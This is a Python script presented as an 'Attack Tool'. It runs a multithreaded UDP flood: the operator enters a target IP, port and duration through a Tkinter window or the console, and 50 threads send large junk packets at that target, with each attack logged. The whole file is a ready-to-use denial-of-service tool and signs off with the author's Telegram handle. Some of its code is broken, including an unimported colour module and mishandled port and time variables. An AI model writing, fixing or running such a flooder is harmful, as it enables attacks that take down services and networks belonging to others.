import socket
import random
import time
import threading
from tkinter import Tk, Label, Button, Entry, StringVar
import logging

logging.basicConfig(filename="attack_logs.txt", level=logging.INFO)

class AttackGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Abo Zienb - Attack Tool")
        
        self.ip_label = Label(root, text="Enter Target IP:")
        self.ip_label.grid(row=0, column=0)
        
        self.ip_entry = Entry(root)
        self.ip_entry.grid(row=0, column=1)
        
        self.port_label = Label(root, text="Enter Target Port:")
        self.port_label.grid(row=1, column=0)
        
        self.port_entry = Entry(root)
        self.port_entry.grid(row=1, column=1)
        
        self.time_label = Label(root, text="Enter Attack Duration (seconds):")
        self.time_label.grid(row=2, column=0)
        
        self.time_entry = Entry(root)
        self.time_entry.grid(row=2, column=1)
        
        self.attack_button = Button(root, text="Start Attack", command=self.start_attack)
        self.attack_button.grid(row=3, column=0, columnspan=2)
        
        self.status_label = Label(root, text="Status: Waiting for input...")
        self.status_label.grid(row=4, column=0, columnspan=2)

    def start_attack(self):
        ip = self.ip_entry.get()
        port = self.port_entry.get()
        duration = self.time_entry.get()
        
        self.status_label.config(text="Status: Attack in progress...")
        logging.info(f"Started attack on {ip}:{port} for {duration} seconds.")
        threading.Thread(target=start_attack, args=(ip, port, int(duration))).start()

def colored_text(text):
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
    colored = ''.join([random.choice(colors) + char for char in text])
    return colored

def show_banner():
    name = "ABO ZIENB"  # جعل الكلمة كبيرة
    print(Fore.BLACK + Fore.WHITE + "╔════════════════════════════════╗")
    print(Fore.WHITE + "║", colored_text(name).center(30), "║")  # جعل الاسم في المنتصف
    print(Fore.BLACK + Fore.WHITE + "╚════════════════════════════════╝")

def get_input():
    print(Fore.YELLOW + "Come in IP:")
    ip = input(Fore.CYAN + "Enter target IP: ")
    
    print(Fore.YELLOW + "Come in Port:")
    port = input(Fore.CYAN + "Enter target Port: ")
    
    print(Fore.YELLOW + "Enter the time:")
    time = input(Fore.CYAN + "Enter attack duration (seconds): ")
    
    return ip, port, time

def read_user_agents(file):
    with open(file, 'r') as f:
        return [line.strip() for line in f.readlines()]

def udp_flood(ip, port, dur):
    user_agents = read_user_agents('ua.txt')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    randport = (True, False)[port == 0]
    clock = (lambda: 0, time.time)[dur > 0]
    duration = (1, (clock() + dur))[dur > 0]
    
    while True:
        user_agent = random.choice(user_agents)
        bytes = user_agent.encode('utf-8') + b" " * (65500 - len(user_agent))  
        port = (random.randint(1, 65535), port)[randport]
        
        if time.time() < duration:
            sock.sendto(bytes, (ip, port))
        else:
            break

def start_attack(ip, port, time, num_threads=50):
    threads = []
    print(f"Attack started on {ip}:{port} for {time} seconds...")
    for i in range(num_threads):
        thread = threading.Thread(target=udp_flood, args=(ip, port, time))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    print("Attack completed.")
    logging.info(f"Attack completed on {ip}:{port}.")

def show_info():
    print(Fore.GREEN + "\nInformation:")
    print(Fore.CYAN + "Age: 29")
    print(Fore.CYAN + "Telegram: @eee_59")

if __name__ == "__main__":
    root = Tk()
    gui = AttackGUI(root)
    root.mainloop()

    show_banner()
    show_info()
    
    ip, port, time = get_input()
    start_attack(ip, port, int(time))
